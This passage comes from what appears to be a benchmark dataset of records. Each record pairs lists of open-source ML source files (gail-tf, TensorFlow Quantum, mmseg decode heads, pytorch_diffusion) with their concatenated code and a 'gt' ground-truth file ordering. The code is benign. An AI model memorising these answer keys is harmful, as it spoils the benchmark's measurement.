mpi4py import MPI\nimport tensorflow as tf, gailtf.baselines.common.tf_util as U, numpy as np\n\nclass RunningMeanStd(object):\n\n    def __init__(self, epsilon=1e-2, shape=()):\n\n        self._sum = tf.get_variable(\n            dtype=tf.float64,\n            shape=shape,\n            initializer=tf.constant_initializer(0.0),\n            name=\"runningsum\", trainable=False)\n        self._sumsq = tf.get_variable(\n            dtype=tf.float64,\n            shape=shape,\n            initializer=tf.constant_initializer(epsilon),\n            name=\"runningsumsq\", trainable=False)\n        self._count = tf.get_variable(\n            dtype=tf.float64,\n            shape=(),\n            initializer=tf.constant_initializer(epsilon),\n            name=\"count\", trainable=False)\n        self.shape = shape\n\n        self.mean = tf.to_float(self._sum / self._count)\n        self.std = tf.sqrt( tf.maximum( tf.to_float(self._sumsq / self._count) - tf.square(self.mean) , 1e-2 ))\n\n        newsum = tf.placeholder(shape=self.shape, dtype=tf.float64, name='sum')\n        newsumsq = tf.placeholder(shape=self.shape, dtype=tf.float64, name='var')\n        newcount = tf.placeholder(shape=[], dtype=tf.float64, name='count')\n        self.incfiltparams = U.function([newsum, newsumsq, newcount], [],\n            updates=[tf.assign_add(self._sum, newsum),\n                     tf.assign_add(self._sumsq, newsumsq),\n                     tf.assign_add(self._count, newcount)])\n\n\n    def update(self, x):\n        x = x.astype('float64')\n        n = int(np.prod(self.shape))\n        totalvec = np.zeros(n*2+1, 'float64')\n        addvec = np.concatenate([x.sum(axis=0).ravel(), np.square(x).sum(axis=0).ravel(), np.array([len(x)],dtype='float64')])\n        MPI.COMM_WORLD.Allreduce(addvec, totalvec, op=MPI.SUM)\n        self.incfiltparams(totalvec[0:n].reshape(self.shape), totalvec[n:2*n].reshape(self.shape), totalvec[2*n])\n\n@U.in_session\ndef test_runningmeanstd():\n    for (x1, x2, x3) in [\n        (np.random.randn(3), np.random.randn(4), np.random.randn(5)),\n        (np.random.randn(3,2), np.random.randn(4,2), np.random.randn(5,2)),\n        ]:\n\n        rms = RunningMeanStd(epsilon=0.0, shape=x1.shape[1:])\n        U.initialize()\n\n        x = np.concatenate([x1, x2, x3], axis=0)\n        ms1 = [x.mean(axis=0), x.std(axis=0)]\n        rms.update(x1)\n        rms.update(x2)\n        rms.update(x3)\n        ms2 = U.eval([rms.mean, rms.std])\n\n        assert np.allclose(ms1, ms2)\n\n@U.in_session\ndef test_dist():\n    np.random.seed(0)\n    p1,p2,p3=(np.random.randn(3,1), np.random.randn(4,1), np.random.randn(5,1))\n    q1,q2,q3=(np.random.randn(6,1), np.random.randn(7,1), np.random.randn(8,1))\n\n\n\n\n    comm = MPI.COMM_WORLD\n    assert comm.Get_size()==2\n    if comm.Get_rank()==0:\n        x1,x2,x3 = p1,p2,p3\n    elif comm.Get_rank()==1:\n        x1,x2,x3 = q1,q2,q3\n    else:\n        assert False\n\n    rms = RunningMeanStd(epsilon=0.0, shape=(1,))\n    U.initialize()\n\n    rms.update(x1)\n    rms.update(x2)\n    rms.update(x3)\n\n    bigvec = np.concatenate([p1,p2,p3,q1,q2,q3])\n\n    def checkallclose(x,y):\n        print(x,y)\n        return np.allclose(x,y)\n\n    assert checkallclose(\n        bigvec.mean(axis=0),\n        U.eval(rms.mean)\n    )\n    assert checkallclose(\n        bigvec.std(axis=0),\n        U.eval(rms.std)\n    )\n\n\nif __name__ == \"__main__\":\n\n    test_dist()\n",
        "gt": [
            "'gail-tf/gailtf/baselines/common/mpi_running_mean_std.py'",
            "'gail-tf/gailtf/baselines/ppo1/mlp_policy.py'",
            "'gail-tf/gailtf/baselines/ppo1/run_mujoco.py'"
        ]
    },
    {
        "files": [
            "'quantum/tensorflow_quantum/python/optimizers/rotosolve_minimizer.py'",
            "'quantum/tensorflow_quantum/__init__.py'",
            "'quantum/tensorflow_quantum/python/optimizers/__init__.py'",
            "'quantum/scripts/build_docs.py'"
        ],
        "content": "'quantum/tensorflow_quantum/python/optimizers/rotosolve_minimizer.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport numpy as np\nimport tensorflow as tf\n\n\ndef prefer_static_shape(x):\n\n    return prefer_static_value(tf.shape(x))\n\n\ndef prefer_static_value(x):\n\n    static_x = tf.get_static_value(x)\n    if static_x is not None:\n        return static_x\n    return x\n\n\nclass RotosolveOptimizerResults(tf.experimental.ExtensionType):\n\n    converged: tf.Tensor\n\n\n    num_iterations: tf.Tensor\n\n    num_objective_evaluations: tf.Tensor\n\n\n    position: tf.Tensor\n\n\n\n\n\n    objective_value_prev: tf.Tensor\n\n\n    objective_value: tf.Tensor\n\n\n\n\n    tolerance: tf.Tensor\n\n\n\n    solve_param_i: tf.Tensor\n\n\n\n\n    def to_dict(self):\n\n        return {\n            \"converged\": self.converged,\n            \"num_iterations\": self.num_iterations,\n            \"num_objective_evaluations\": self.num_objective_evaluations,\n            \"position\": self.position,\n            \"objective_value\": self.objective_value,\n            \"objective_value_prev\": self.objective_value_prev,\n            \"tolerance\": self.tolerance,\n            \"solve_param_i\": self.solve_param_i,\n        }\n\n\ndef _get_initial_state(initial_position, tolerance, expectation_value_function):\n\n    init_args = {\n        \"converged\": tf.Variable(False),\n        \"num_iterations\": tf.Variable(0),\n        \"num_objective_evaluations\": tf.Variable(0),\n        \"position\": tf.Variable(initial_position),\n        \"objective_value\": expectation_value_function(initial_position),\n        \"objective_value_prev\": tf.Variable(0.),\n        \"tolerance\": tolerance,\n        \"solve_param_i\": tf.Variable(0),\n    }\n    return RotosolveOptimizerResults(**init_args)\n\n\ndef minimize(expectation_value_function,\n             initial_position,\n             tolerance=1e-5,\n             max_iterations=50,\n             name=None):\n\n\n    with tf.name_scope(name or 'minimize'):\n        initial_position = tf.convert_to_tensor(initial_position,\n                                                name='initial_position',\n                                                dtype='float32')\n        dtype = initial_position.dtype.base_dtype\n        tolerance = tf.convert_to_tensor(tolerance,\n                                         dtype=dtype,\n                                         name='grad_tolerance')\n        max_iterations = tf.convert_to_tensor(max_iterations,\n                                              name='max_iterations')\n\n        def _rotosolve_one_parameter_once(state):\n\n            delta_shift = tf.scatter_nd([[state.solve_param_i]],\n                                        [tf.constant(np.pi / 2, dtype=dtype)],\n                                        prefer_static_shape(state.position))\n\n\n            v_l, v_n, v_r = expectation_value_function(\n                state.position - delta_shift), \\\n                state.objective_value, \\\n                expectation_value_function(state.position + delta_shift)\n\n\n            delta_update = -np.pi / 2 - \\\n                tf.math.atan2(2 * v_n - v_l - v_r, v_r - v_l)\n\n            delta_update_tensor = tf.scatter_nd(\n                [[state.solve_param_i]], [delta_update],\n                prefer_static_shape(state.position))\n\n            new_position = (tf.math.floormod(\n                state.position + delta_update_tensor, np.pi * 2))\n            next_state_params = state.to_dict()\n            next_state_params.update({\n                \"solve_param_i\": state.solve_param_i + 1,\n                \"position\": new_position,\n                \"objective_value_prev\": state.objective_value,\n                \"objective_value\": (expectation_value_function(new_position)),\n            })\n            return [RotosolveOptimizerResults(**next_state_params)]\n\n        def _rotosolve_all_parameters_once(state):\n\n\n            def _cond_internal(state_cond):\n                return state_cond.solve_param_i < \\\n                       prefer_static_shape(state_cond.position)[0]\n\n            next_state_params = state.to_dict()\n            next_state_params.update({\n                \"num_objective_evaluations\":\n                    state.num_objective_evaluations + 1,\n            })\n\n            return tf.while_loop(\n                cond=_cond_internal,\n                body=_rotosolve_one_parameter_once,\n                loop_vars=[RotosolveOptimizerResults(**next_state_params)],\n                parallel_iterations=1,\n            )\n\n\n\n        def _cond(state):\n\n            return (state.num_iterations < max_iterations) \\\n                   and (not state.converged)\n\n        def _body(state):\n\n            pre_state_params = state.to_dict()\n            pre_state_params.update({\"solve_param_i\": 0})\n            pre_state = RotosolveOptimizerResults(**pre_state_params)\n            post_state = _rotosolve_all_parameters_once(pre_state)[0]\n            next_state_params = post_state.to_dict()\n            next_state_params.update({\n                \"converged\": (tf.abs(post_state.objective_value -\n                                     post_state.objective_value_prev) <\n                              post_state.tolerance),\n                \"num_iterations\": post_state.num_iterations + 1,\n            })\n            return [RotosolveOptimizerResults(**next_state_params)]\n\n        initial_state = _get_initial_state(initial_position, tolerance,\n                                           expectation_value_function)\n\n        return tf.while_loop(cond=_cond,\n                             body=_body,\n                             loop_vars=[initial_state],\n                             parallel_iterations=1)[0]\n\n'quantum/tensorflow_quantum/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom tensorflow_quantum.core import (append_circuit, get_expectation_op,\n                                     get_sampled_expectation_op,\n                                     get_sampling_op, get_state_op,\n                                     get_unitary_op, padded_to_ragged,\n                                     padded_to_ragged2d, resolve_parameters)\n\n\nfrom tensorflow_quantum.core import math_ops as math\n\n\nfrom tensorflow_quantum.core import noise\n\n\nimport tensorflow_quantum.python.layers as layers\n\n\nfrom tensorflow_quantum.python.quantum_context import (\n\n    get_quantum_concurrent_op_mode,\n    set_quantum_concurrent_op_mode,\n)\n\n\nfrom tensorflow_quantum.python.util import (\n\n    convert_to_tensor,\n    from_tensor,\n)\n\n\nimport tensorflow_quantum.python.util as util\n\n\nimport tensorflow_quantum.datasets as datasets\n\n\nimport tensorflow_quantum.python.differentiators as differentiators\n\n\nimport tensorflow_quantum.python.optimizers as optimizers\n\n\n\n\n\ndel python\ndel core\n\n\n__version__ = '0.7.2'\n\n'quantum/tensorflow_quantum/python/optimizers/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom tensorflow_quantum.python.optimizers.rotosolve_minimizer import (\n    minimize as rotosolve_minimize)\nfrom tensorflow_quantum.python.optimizers.spsa_minimizer import (minimize as\n                                                                 spsa_minimize)\n\n'quantum/scripts/build_docs.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport os\n\nfrom absl import app\nfrom absl import flags\nfrom tensorflow_docs.api_generator import doc_controls\nfrom tensorflow_docs.api_generator import generate_lib\nfrom tensorflow_docs.api_generator import public_api\n\nimport tensorflow_quantum as tfq\n\nflags.DEFINE_string(\"output_dir\", \"/tmp/tfq_api\", \"Where to output the docs\")\n\nflags.DEFINE_string(\"code_url_prefix\",\n                    (\"https://github.com/tensorflow/quantum/tree/master/\"\n                     \"tensorflow_quantum\"), \"The url prefix for links to code.\")\n\nflags.DEFINE_bool(\"search_hints\", True,\n                  \"Include metadata search hints in the generated files\")\n\nflags.DEFINE_string(\"site_path\", \"quantum/api_docs/python\",\n                    \"Path prefix in the _toc.yaml\")\n\nFLAGS = flags.FLAGS\n\n\n\n\ndef main(unused_argv):\n\n    doc_generator = generate_lib.DocGenerator(\n        root_title=\"TensorFlow Quantum\",\n        py_modules=[(\"tfq\", tfq)],\n        base_dir=os.path.dirname(tfq.__file__),\n        code_url_prefix=FLAGS.code_url_prefix,\n        search_hints=FLAGS.search_hints,\n        site_path=FLAGS.site_path,\n        callbacks=[public_api.local_definitions_filter],\n        private_map={\n            \"tfq\": [\"python\", \"core\"],\n            \"tfq.layers\": [\n                \"circuit_construction\",\n                \"circuit_executors\",\n                \"high_level\",\n            ],\n            \"tfq.differentiators\": [\n                \"linear_combination\", \"differentiator\", \"parameter_shift\",\n                \"parameter_shift_util\", \"adjoint\"\n            ],\n            \"tfq.datasets\": [\"cluster_state\"],\n            \"tfq.optimizers\": [\"rotosolve_minimizer\", \"spsa_minimizer\"],\n            \"tfq.util\": [\n                \"from_tensor\", \"convert_to_tensor\", \"exp_identity\",\n                \"check_commutability\", \"kwargs_cartesian_product\",\n                \"random_circuit_resolver_batch\", \"random_pauli_sums\",\n                \"random_symbol_circuit\", \"random_symbol_circuit_resolver_batch\"\n            ],\n            \"tfq.math\": [\"fidelity_op\", \"inner_product_op\"],\n            \"tfq.noise\": [\n                \"noisy_expectation_op\", \"noisy_sampled_expectation_op\",\n                \"noisy_samples_op\"\n            ]\n        })\n\n    doc_generator.build(output_dir=FLAGS.output_dir)\n\n\nif __name__ == \"__main__\":\n    app.run(main)\n",
        "gt": [
            "'quantum/tensorflow_quantum/python/optimizers/rotosolve_minimizer.py'",
            "'quantum/tensorflow_quantum/python/optimizers/__init__.py'",
            "'quantum/tensorflow_quantum/__init__.py'",
            "'quantum/scripts/build_docs.py'"
        ]
    },
    {
        "files": [
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/decode_head.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/__init__.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/lraspp_head.py'"
        ],
        "content": "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/decode_head.py'\n:from abc import ABCMeta, abstractmethod\n\nimport torch\nimport torch.nn as nn\nfrom annotator.uniformer.mmcv.cnn import normal_init\nfrom annotator.uniformer.mmcv.runner import auto_fp16, force_fp32\n\nfrom annotator.uniformer.mmseg.core import build_pixel_sampler\nfrom annotator.uniformer.mmseg.ops import resize\nfrom ..builder import build_loss\nfrom ..losses import accuracy\n\n\nclass BaseDecodeHead(nn.Module, metaclass=ABCMeta):\n\n\n    def __init__(self,\n                 in_channels,\n                 channels,\n                 *,\n                 num_classes,\n                 dropout_ratio=0.1,\n                 conv_cfg=None,\n                 norm_cfg=None,\n                 act_cfg=dict(type='ReLU'),\n                 in_index=-1,\n                 input_transform=None,\n                 loss_decode=dict(\n                     type='CrossEntropyLoss',\n                     use_sigmoid=False,\n                     loss_weight=1.0),\n                 ignore_index=255,\n                 sampler=None,\n                 align_corners=False):\n        super(BaseDecodeHead, self).__init__()\n        self._init_inputs(in_channels, in_index, input_transform)\n        self.channels = channels\n        self.num_classes = num_classes\n        self.dropout_ratio = dropout_ratio\n        self.conv_cfg = conv_cfg\n        self.norm_cfg = norm_cfg\n        self.act_cfg = act_cfg\n        self.in_index = in_index\n        self.loss_decode = build_loss(loss_decode)\n        self.ignore_index = ignore_index\n        self.align_corners = align_corners\n        if sampler is not None:\n            self.sampler = build_pixel_sampler(sampler, context=self)\n        else:\n            self.sampler = None\n\n        self.conv_seg = nn.Conv2d(channels, num_classes, kernel_size=1)\n        if dropout_ratio > 0:\n            self.dropout = nn.Dropout2d(dropout_ratio)\n        else:\n            self.dropout = None\n        self.fp16_enabled = False\n\n    def extra_repr(self):\n\n        s = f'input_transform={self.input_transform}, ' \\\n            f'ignore_index={self.ignore_index}, ' \\\n            f'align_corners={self.align_corners}'\n        return s\n\n    def _init_inputs(self, in_channels, in_index, input_transform):\n\n\n        if input_transform is not None:\n            assert input_transform in ['resize_concat', 'multiple_select']\n        self.input_transform = input_transform\n        self.in_index = in_index\n        if input_transform is not None:\n            assert isinstance(in_channels, (list, tuple))\n            assert isinstance(in_index, (list, tuple))\n            assert len(in_channels) == len(in_index)\n            if input_transform == 'resize_concat':\n                self.in_channels = sum(in_channels)\n            else:\n                self.in_channels = in_channels\n        else:\n            assert isinstance(in_channels, int)\n            assert isinstance(in_index, int)\n            self.in_channels = in_channels\n\n    def init_weights(self):\n\n        normal_init(self.conv_seg, mean=0, std=0.01)\n\n    def _transform_inputs(self, inputs):\n\n\n        if self.input_transform == 'resize_concat':\n            inputs = [inputs[i] for i in self.in_index]\n            upsampled_inputs = [\n                resize(\n                    input=x,\n                    size=inputs[0].shape[2:],\n                    mode='bilinear',\n                    align_corners=self.align_corners) for x in inputs\n            ]\n            inputs = torch.cat(upsampled_inputs, dim=1)\n        elif self.input_transform == 'multiple_select':\n            inputs = [inputs[i] for i in self.in_index]\n        else:\n            inputs = inputs[self.in_index]\n\n        return inputs\n\n    @auto_fp16()\n    @abstractmethod\n    def forward(self, inputs):\n\n        pass\n\n    def forward_train(self, inputs, img_metas, gt_semantic_seg, train_cfg):\n\n        seg_logits = self.forward(inputs)\n        losses = self.losses(seg_logits, gt_semantic_seg)\n        return losses\n\n    def forward_test(self, inputs, img_metas, test_cfg):\n\n        return self.forward(inputs)\n\n    def cls_seg(self, feat):\n\n        if self.dropout is not None:\n            feat = self.dropout(feat)\n        output = self.conv_seg(feat)\n        return output\n\n    @force_fp32(apply_to=('seg_logit', ))\n    def losses(self, seg_logit, seg_label):\n\n        loss = dict()\n        seg_logit = resize(\n            input=seg_logit,\n            size=seg_label.shape[2:],\n            mode='bilinear',\n            align_corners=self.align_corners)\n        if self.sampler is not None:\n            seg_weight = self.sampler.sample(seg_logit, seg_label)\n        else:\n            seg_weight = None\n        seg_label = seg_label.squeeze(1)\n        loss['loss_seg'] = self.loss_decode(\n            seg_logit,\n            seg_label,\n            weight=seg_weight,\n            ignore_index=self.ignore_index)\n        loss['acc_seg'] = accuracy(seg_logit, seg_label)\n        return loss\n\n'controlvideo/annotator/uniformer/mmseg/models/decode_heads/__init__.py'\n:from .ann_head import ANNHead\nfrom .apc_head import APCHead\nfrom .aspp_head import ASPPHead\nfrom .cc_head import CCHead\nfrom .da_head import DAHead\nfrom .dm_head import DMHead\nfrom .dnl_head import DNLHead\nfrom .ema_head import EMAHead\nfrom .enc_head import EncHead\nfrom .fcn_head import FCNHead\nfrom .fpn_head import FPNHead\nfrom .gc_head import GCHead\nfrom .lraspp_head import LRASPPHead\nfrom .nl_head import NLHead\nfrom .ocr_head import OCRHead\n\nfrom .psa_head import PSAHead\nfrom .psp_head import PSPHead\nfrom .sep_aspp_head import DepthwiseSeparableASPPHead\nfrom .sep_fcn_head import DepthwiseSeparableFCNHead\nfrom .uper_head import UPerHead\n\n__all__ = [\n    'FCNHead', 'PSPHead', 'ASPPHead', 'PSAHead', 'NLHead', 'GCHead', 'CCHead',\n    'UPerHead', 'DepthwiseSeparableASPPHead', 'ANNHead', 'DAHead', 'OCRHead',\n    'EncHead', 'DepthwiseSeparableFCNHead', 'FPNHead', 'EMAHead', 'DNLHead',\n    'APCHead', 'DMHead', 'LRASPPHead'\n]\n\n'controlvideo/annotator/uniformer/mmseg/models/decode_heads/lraspp_head.py'\n:import torch\nimport torch.nn as nn\nfrom annotator.uniformer.mmcv import is_tuple_of\nfrom annotator.uniformer.mmcv.cnn import ConvModule\n\nfrom annotator.uniformer.mmseg.ops import resize\nfrom ..builder import HEADS\nfrom .decode_head import BaseDecodeHead\n\n\n@HEADS.register_module()\nclass LRASPPHead(BaseDecodeHead):\n\n\n    def __init__(self, branch_channels=(32, 64), **kwargs):\n        super(LRASPPHead, self).__init__(**kwargs)\n        if self.input_transform != 'multiple_select':\n            raise ValueError('in Lite R-ASPP (LRASPP) head, input_transform '\n                             f'must be \\'multiple_select\\'. But received '\n                             f'\\'{self.input_transform}\\'')\n        assert is_tuple_of(branch_channels, int)\n        assert len(branch_channels) == len(self.in_channels) - 1\n        self.branch_channels = branch_channels\n\n        self.convs = nn.Sequential()\n        self.conv_ups = nn.Sequential()\n        for i in range(len(branch_channels)):\n            self.convs.add_module(\n                f'conv{i}',\n                nn.Conv2d(\n                    self.in_channels[i], branch_channels[i], 1, bias=False))\n            self.conv_ups.add_module(\n                f'conv_up{i}',\n                ConvModule(\n                    self.channels + branch_channels[i],\n                    self.channels,\n                    1,\n                    norm_cfg=self.norm_cfg,\n                    act_cfg=self.act_cfg,\n                    bias=False))\n\n        self.conv_up_input = nn.Conv2d(self.channels, self.channels, 1)\n\n        self.aspp_conv = ConvModule(\n            self.in_channels[-1],\n            self.channels,\n            1,\n            norm_cfg=self.norm_cfg,\n            act_cfg=self.act_cfg,\n            bias=False)\n        self.image_pool = nn.Sequential(\n            nn.AvgPool2d(kernel_size=49, stride=(16, 20)),\n            ConvModule(\n                self.in_channels[2],\n                self.channels,\n                1,\n                act_cfg=dict(type='Sigmoid'),\n                bias=False))\n\n    def forward(self, inputs):\n\n        inputs = self._transform_inputs(inputs)\n\n        x = inputs[-1]\n\n        x = self.aspp_conv(x) * resize(\n            self.image_pool(x),\n            size=x.size()[2:],\n            mode='bilinear',\n            align_corners=self.align_corners)\n        x = self.conv_up_input(x)\n\n        for i in range(len(self.branch_channels) - 1, -1, -1):\n            x = resize(\n                x,\n                size=inputs[i].size()[2:],\n                mode='bilinear',\n                align_corners=self.align_corners)\n            x = torch.cat([x, self.convs[i](inputs[i])], 1)\n            x = self.conv_ups[i](x)\n\n        return self.cls_seg(x)\n",
        "gt": [
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/decode_head.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/lraspp_head.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/decode_heads/__init__.py'"
        ]
    },
    {
        "files": [
            "'pytorch_diffusion/pytorch_diffusion/ckpt_util.py'",
            "'pytorch_diffusion/pytorch_diffusion/diffusion.py'",
            "'pytorch_diffusion/pytorch_diffusion/__init__.py'"
        ],
        "content": "'pytorch_diffusion/pytorch_diffusion/ckpt_util.py'\n:import os, hashlib\nimport requests\nfrom tqdm import tqdm\n\nURL_MAP = {\n    \"cifar10\": \"https://heibox.uni-heidelberg.de/f/869980b53bf5416c8a28/?dl=1\",\n    \"ema_cifar10\": \"https://heibox.uni-heidelberg.de/f/2e4f01e2d9ee49bab1d5/?dl=1\",\n    \"lsun_bedroom\": \"https://heibox.uni-heidelberg.de/f/f179d4f21ebc4d43bbfe/?dl=1\",\n    \"ema_lsun_bedroom\": \"https://heibox.uni-heidelberg.de/f/b95206528f384185889b/?dl=1\",\n    \"lsun_cat\": \"https://heibox.uni-heidelberg.de/f/fac870bd988348eab88e/?dl=1\",\n    \"ema_lsun_cat\": \"https://heibox.uni-heidelberg.de/f/0701aac3aa69457bbe34/?dl=1\",\n    \"lsun_church\": \"https://heibox.uni-heidelberg.de/f/2711a6f712e34b06b9d8/?dl=1\",\n    \"ema_lsun_church\": \"https://heibox.uni-heidelberg.de/f/44ccb50ef3c6436db52e/?dl=1\",\n}\nCKPT_MAP = {\n    \"cifar10\": \"diffusion_cifar10_model/model-790000.ckpt\",\n    \"ema_cifar10\": \"ema_diffusion_cifar10_model/model-790000.ckpt\",\n    \"lsun_bedroom\": \"diffusion_lsun_bedroom_model/model-2388000.ckpt\",\n    \"ema_lsun_bedroom\": \"ema_diffusion_lsun_bedroom_model/model-2388000.ckpt\",\n    \"lsun_cat\": \"diffusion_lsun_cat_model/model-1761000.ckpt\",\n    \"ema_lsun_cat\": \"ema_diffusion_lsun_cat_model/model-1761000.ckpt\",\n    \"lsun_church\": \"diffusion_lsun_church_model/model-4432000.ckpt\",\n    \"ema_lsun_church\": \"ema_diffusion_lsun_church_model/model-4432000.ckpt\",\n}\nMD5_MAP = {\n    \"cifar10\": \"82ed3067fd1002f5cf4c339fb80c4669\",\n    \"ema_cifar10\": \"1fa350b952534ae442b1d5235cce5cd3\",\n    \"lsun_bedroom\": \"f70280ac0e08b8e696f42cb8e948ff1c\",\n    \"ema_lsun_bedroom\": \"1921fa46b66a3665e450e42f36c2720f\",\n    \"lsun_cat\": \"bbee0e7c3d7abfb6e2539eaf2fb9987b\",\n    \"ema_lsun_cat\": \"646f23f4821f2459b8bafc57fd824558\",\n    \"lsun_church\": \"eb619b8a5ab95ef80f94ce8a5488dae3\",\n    \"ema_lsun_church\": \"fdc68a23938c2397caba4a260bc2445f\",\n}\n\ndef download(url, local_path, chunk_size = 1024):\n    os.makedirs(os.path.split(local_path)[0], exist_ok=True)\n    with requests.get(url, stream = True) as r:\n        total_size = int(r.headers.get(\"content-length\", 0))\n        with tqdm(total = total_size, unit = \"B\", unit_scale = True) as pbar:\n            with open(local_path, \"wb\") as f:\n                for data in r.iter_content(chunk_size = chunk_size):\n                    if data:\n                        f.write(data)\n                        pbar.update(chunk_size)\n\ndef md5_hash(path):\n    with open(path, \"rb\") as f:\n        content = f.read()\n    return hashlib.md5(content).hexdigest()\n\ndef get_ckpt_path(name, root=None, check=False):\n    assert name in URL_MAP\n    cachedir = os.environ.get(\"XDG_CACHE_HOME\", os.path.expanduser(\"~/.cache\"))\n    root = root if root is not None else os.path.join(cachedir, \"diffusion_models_converted\")\n    path = os.path.join(root, CKPT_MAP[name])\n    if not os.path.exists(path) or (check and not md5_hash(path)==MD5_MAP[name]):\n        print(\"Downloading {} model from {} to {}\".format(name, URL_MAP[name], path))\n        download(URL_MAP[name], path)\n        md5 = md5_hash(path)\n        assert md5==MD5_MAP[name], md5\n    return path\n\n'pytorch_diffusion/pytorch_diffusion/diffusion.py'\n:import numpy as np\nimport torch\n\nfrom pytorch_diffusion.model import Model\nfrom pytorch_diffusion.ckpt_util import get_ckpt_path\n\n\ndef get_beta_schedule(beta_schedule, *, beta_start, beta_end, num_diffusion_timesteps):\n    if beta_schedule == 'quad':\n        betas = np.linspace(beta_start ** 0.5, beta_end ** 0.5, num_diffusion_timesteps, dtype=np.float64) ** 2\n    elif beta_schedule == 'linear':\n        betas = np.linspace(beta_start, beta_end, num_diffusion_timesteps, dtype=np.float64)\n    elif beta_schedule == 'warmup10':\n        betas = _warmup_beta(beta_start, beta_end, num_diffusion_timesteps, 0.1)\n    elif beta_schedule == 'warmup50':\n        betas = _warmup_beta(beta_start, beta_end, num_diffusion_timesteps, 0.5)\n    elif beta_schedule == 'const':\n        betas = beta_end * np.ones(num_diffusion_timesteps, dtype=np.float64)\n    elif beta_schedule == 'jsd':\n        betas = 1. / np.linspace(num_diffusion_timesteps, 1, num_diffusion_timesteps, dtype=np.float64)\n    else:\n        raise NotImplementedError(beta_schedule)\n    assert betas.shape == (num_diffusion_timesteps,)\n    return betas\n\n\ndef extract(a, t, x_shape):\n\n    bs, = t.shape\n    assert x_shape[0] == bs\n    out = torch.gather(torch.tensor(a).float().to(device=t.device), 0, t.long())\n    assert out.shape == (bs,)\n    out = out.reshape((bs,)+(1,)*(len(x_shape)-1))\n    return out\n\n\ndef diffusion_step(x, t, *,\n                   noise=None,\n                   sqrt_alphas,\n                   sqrt_one_minus_alphas):\n\n    if noise is None:\n        noise = torch.randn_like(x)\n    assert noise.shape == x.shape\n    return (\n        extract(sqrt_alphas, t, x.shape) * x +\n        extract(sqrt_one_minus_alphas, t, x.shape) * noise\n    )\n\n\ndef denoising_step(x, t, *,\n                   model,\n                   logvar,\n                   sqrt_recip_alphas_cumprod,\n                   sqrt_recipm1_alphas_cumprod,\n                   posterior_mean_coef1,\n                   posterior_mean_coef2,\n                   return_pred_xstart=False):\n\n\n\n\n    model_output = model(x, t)\n\n\n    pred_xstart = (extract(sqrt_recip_alphas_cumprod, t, x.shape)*x -\n                   extract(sqrt_recipm1_alphas_cumprod, t, x.shape)*model_output)\n    pred_xstart = torch.clamp(pred_xstart, -1, 1)\n\n    mean = (extract(posterior_mean_coef1, t, x.shape)*pred_xstart +\n            extract(posterior_mean_coef2, t, x.shape)*x)\n\n    logvar = extract(logvar, t, x.shape)\n\n\n    noise = torch.randn_like(x)\n    mask = 1-(t==0).float()\n    mask = mask.reshape((x.shape[0],)+(1,)*(len(x.shape)-1))\n    sample = mean + mask*torch.exp(0.5*logvar)*noise\n    sample = sample.float()\n    if return_pred_xstart:\n        return sample, pred_xstart\n    return sample\n\n\nclass Diffusion(object):\n    def __init__(self, diffusion_config, model_config, device=None):\n        self.init_diffusion_parameters(**diffusion_config)\n        self.model = Model(**model_config)\n        if device is None:\n            device = torch.device(\"cuda\") if torch.cuda.is_available() else torch.device(\"cpu\")\n        self.device = device\n        self.model.to(self.device)\n\n\n    def init_diffusion_parameters(self, **config):\n        self.model_var_type = config.get(\"model_var_type\", \"fixedsmall\")\n        betas=get_beta_schedule(\n            beta_schedule=config['beta_schedule'],\n            beta_start=config['beta_start'],\n            beta_end=config['beta_end'],\n            num_diffusion_timesteps=config['num_diffusion_timesteps']\n        )\n        self.num_timesteps = betas.shape[0]\n\n        alphas = 1.0-betas\n        alphas_cumprod = np.cumprod(alphas, axis=0)\n        alphas_cumprod_prev = np.append(1.0, alphas_cumprod[:-1])\n        posterior_variance = betas*(1.0-alphas_cumprod_prev) / (1.0-alphas_cumprod)\n        sqrt_recip_alphas_cumprod = np.sqrt(1. / alphas_cumprod)\n        sqrt_recipm1_alphas_cumprod = np.sqrt(1. / alphas_cumprod - 1)\n        posterior_mean_coef1 = betas * np.sqrt(alphas_cumprod_prev) / (1. - alphas_cumprod)\n        posterior_mean_coef2 = (1. - alphas_cumprod_prev) * np.sqrt(alphas) / (1. - alphas_cumprod)\n\n        self.alphas = alphas\n        self.sqrt_recip_alphas_cumprod = sqrt_recip_alphas_cumprod\n        self.sqrt_recipm1_alphas_cumprod = sqrt_recipm1_alphas_cumprod\n        self.posterior_mean_coef1 = posterior_mean_coef1\n        self.posterior_mean_coef2 = posterior_mean_coef2\n        self.sqrt_alphas = np.sqrt(alphas)\n        self.sqrt_one_minus_alphas = np.sqrt(1. - alphas)\n\n        if self.model_var_type == \"fixedlarge\":\n            self.logvar = np.log(np.append(posterior_variance[1], betas[1:]))\n        elif self.model_var_type == 'fixedsmall':\n            self.logvar = np.log(np.maximum(posterior_variance, 1e-20))\n\n\n    @classmethod\n    def from_pretrained(cls, name, device=None):\n        cifar10_cfg = {\n            \"resolution\": 32,\n            \"in_channels\": 3,\n            \"out_ch\": 3,\n            \"ch\": 128,\n            \"ch_mult\": (1,2,2,2),\n            \"num_res_blocks\": 2,\n            \"attn_resolutions\": (16,),\n            \"dropout\": 0.1,\n        }\n        lsun_cfg = {\n            \"resolution\": 256,\n            \"in_channels\": 3,\n            \"out_ch\": 3,\n            \"ch\": 128,\n            \"ch_mult\": (1,1,2,2,4,4),\n            \"num_res_blocks\": 2,\n            \"attn_resolutions\": (16,),\n            \"dropout\": 0.0,\n        }\n\n        model_config_map = {\n            \"cifar10\": cifar10_cfg,\n            \"lsun_bedroom\": lsun_cfg,\n            \"lsun_cat\": lsun_cfg,\n            \"lsun_church\": lsun_cfg,\n        }\n\n        diffusion_config = {\n            \"beta_schedule\": \"linear\",\n            \"beta_start\": 0.0001,\n            \"beta_end\": 0.02,\n            \"num_diffusion_timesteps\": 1000,\n        